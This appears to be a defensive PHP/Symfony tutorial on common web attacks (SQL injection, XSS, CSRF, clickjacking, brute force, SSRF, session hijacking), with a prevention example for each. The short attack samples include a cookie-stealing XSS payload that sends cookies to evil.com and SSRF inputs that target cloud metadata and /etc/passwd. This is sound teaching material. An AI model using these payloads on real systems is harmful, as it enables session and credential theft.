Web applications face many types of attacks. Here are the most common ones, how they work, and how to prevent them.

### SQL Injection

An attacker inserts SQL code into user input fields to manipulate database queries.

#### How it works:

```php
// Vulnerable code
$email = $_POST['email'];
$query = "SELECT * FROM users WHERE email = '$email'";

// Attacker enters: ' OR '1'='1' --
// Resulting query: SELECT * FROM users WHERE email = '' OR '1'='1' --'
// This returns ALL users from the database
```

#### Prevention:

```php
// Use prepared statements (parameterized queries)
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = :email");
$stmt->execute(['email' => $email]);

// With Doctrine ORM — already safe
$user = $repository->findOneBy(['email' => $email]);

// With Doctrine DQL — use parameters
$query = $em->createQuery('SELECT u FROM User u WHERE u.email = :email');
$query->setParameter('email', $email);
```

**Rule:** Never put user input directly into a SQL query string.

---

### Cross-Site Scripting (XSS)

An attacker injects JavaScript code into a web page that other users will see.

#### Types:

1. **Stored XSS** — malicious script is saved to the database (e.g., in a comment) and displayed to all users
2. **Reflected XSS** — malicious script is in the URL and reflected back in the response
3. **DOM-based XSS** — the script is executed by client-side JavaScript

#### How it works:

```php
// Vulnerable — output user data without escaping
echo "<h1>Hello, " . $_GET['name'] . "</h1>";

// Attacker sends: ?name=<script>document.location='http://evil.com/?c='+document.cookie</script>
// The script runs in the victim's browser and steals their cookies
```

#### Prevention:

```php
// Escape output
echo "<h1>Hello, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') . "</h1>";

// In Twig templates — auto-escaping is enabled by default
{{ user.name }}  {# automatically escaped #}
{{ user.bio|raw }}  {# NOT escaped — use only when you trust the content #}
```

Also set these HTTP headers:
```
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
```

---

### Cross-Site Request Forgery (CSRF)

An attacker tricks a logged-in user into performing an action on a website without their knowledge.

#### How it works:

1. User is logged in to their bank at `bank.com`
2. User visits a malicious page that contains:
```html
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```
3. The browser sends the request to `bank.com` with the user's cookies → transfer happens

#### Prevention:

```php
// 1. CSRF tokens — include a unique token in every form
<form method="POST">
    <input type="hidden" name="_token" value="{{ csrf_token('form') }}">
    <!-- form fields -->
</form>

// Server verifies the token
if (!$this->isCsrfTokenValid('form', $request->get('_token'))) {
    throw new AccessDeniedHttpException('Invalid CSRF token');
}

// 2. SameSite cookies
session.cookie_samesite = "Lax"  // or "Strict"
```

> See also: [What is CSRF](csrf.md) for a more detailed explanation.

---

### Clickjacking

An attacker loads your website inside an invisible iframe on their page. When the user clicks on the attacker's page, they actually click on your website.

#### How it works:

```html
<!-- Attacker's page -->
<style>
    iframe { opacity: 0; position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
</style>
<p>Click here to win a prize!</p>
<iframe src="https://bank.com/transfer?to=attacker&amount=1000"></iframe>
```

#### Prevention:

```
# HTTP Headers
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
```

```php
// In Symfony
$response->headers->set('X-Frame-Options', 'DENY');
```

---

### Brute Force Attack

An attacker tries many passwords (or usernames) to gain access to an account.

#### How it works:

```
POST /login  email=admin@site.com&password=123456
POST /login  email=admin@site.com&password=password
POST /login  email=admin@site.com&password=admin123
... thousands more attempts
```

#### Prevention:

```php
// Rate limiting
use Symfony\Component\RateLimiter\RateLimiterFactory;

public function login(Request $request, RateLimiterFactory $loginLimiter): Response
{
    $limiter = $loginLimiter->create($request->getClientIp());
    
    if (!$limiter->consume(1)->isAccepted()) {
        return new JsonResponse(['error' => 'Too many attempts. Try again later.'], 429);
    }
    
    // ... proceed with login
}
```

Other protections:
- Account lockout after N failed attempts
- CAPTCHA after failed attempts
- Two-factor authentication (2FA)
- Require strong passwords

---

### Server-Side Request Forgery (SSRF)

An attacker makes the server send HTTP requests to internal resources that should not be accessible from outside.

#### How it works:

```php
// Vulnerable — fetch any URL the user provides
$url = $_GET['url'];
$content = file_get_contents($url);

// Attacker sends: ?url=http://localhost:6379/  → access internal Redis
// Attacker sends: ?url=http://169.254.169.254/latest/meta-data/  → access AWS credentials
// Attacker sends: ?url=file:///etc/passwd  → read local files
```

#### Prevention:

```php
function fetchExternalUrl(string $url): string
{
    $parsed = parse_url($url);
    
    // Only allow HTTPS
    if ($parsed['scheme'] !== 'https') {
        throw new InvalidArgumentException('Only HTTPS allowed');
    }
    
    // Block internal IPs
    $ip = gethostbyname($parsed['host']);
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        throw new InvalidArgumentException('Internal addresses not allowed');
    }
    
    // Whitelist allowed domains
    $allowed = ['api.trusted-service.com'];
    if (!in_array($parsed['host'], $allowed)) {
        throw new InvalidArgumentException('Domain not allowed');
    }
    
    return file_get_contents($url);
}
```

---

### Session Hijacking

An attacker steals a user's session ID to impersonate them.

#### How it works:

1. Attacker gets the session ID through XSS, network sniffing, or session fixation
2. Attacker sends requests with the stolen session ID
3. Server thinks the attacker is the legitimate user

#### Prevention:

```php
// Secure session configuration (php.ini or Symfony config)
session.cookie_httponly = 1      // JavaScript cannot read the cookie
session.cookie_secure = 1       // Cookie only sent over HTTPS
session.cookie_samesite = "Lax" // Cookie not sent with cross-site requests
session.use_strict_mode = 1     // Reject uninitialized session IDs

// Regenerate session ID after login
session_regenerate_id(true);

// In Symfony
$request->getSession()->migrate(true);
```

### Prevention Summary Table

| Attack | Main Prevention |
|--------|----------------|
| SQL Injection | Prepared statements / parameterized queries |
| XSS | Output escaping, Content-Security-Policy header |
| CSRF | CSRF tokens, SameSite cookies |
| Clickjacking | X-Frame-Options: DENY |
| Brute Force | Rate limiting, account lockout, 2FA |
| SSRF | URL validation, whitelist, block internal IPs |
| Session Hijacking | HttpOnly + Secure cookies, session regeneration |

### Real Scenario

During a code review, you find these issues in a PHP application:

```php
// Issue 1: SQL Injection
$products = $db->query("SELECT * FROM products WHERE name LIKE '%{$_GET['search']}%'");
// Fix: Use prepared statement with parameter binding

// Issue 2: XSS
echo "Welcome, " . $_SESSION['username'];
// Fix: echo "Welcome, " . htmlspecialchars($_SESSION['username'], ENT_QUOTES, 'UTF-8');

// Issue 3: No CSRF protection on a form that changes user email
<form method="POST" action="/change-email">
    <input name="email" value="">
    <button>Change</button>
</form>
// Fix: Add CSRF token hidden field and verify it on the server

// Issue 4: No rate limiting on password reset
// Fix: Add rate limiter — max 3 password reset requests per hour per email
```

Each fix is small but prevents a serious vulnerability.

### Conclusion

The most common web attacks are SQL injection, XSS, CSRF, clickjacking, brute force, SSRF, and session hijacking. Each has clear prevention methods: use prepared statements for SQL, escape output for XSS, use tokens for CSRF, set security headers for clickjacking, add rate limiting for brute force, validate URLs for SSRF, and use secure cookie settings for session protection.

> See also: [OWASP Top 10](owasp_top_10.md), [What is CSRF](csrf.md), [What is CORS](cors.md)
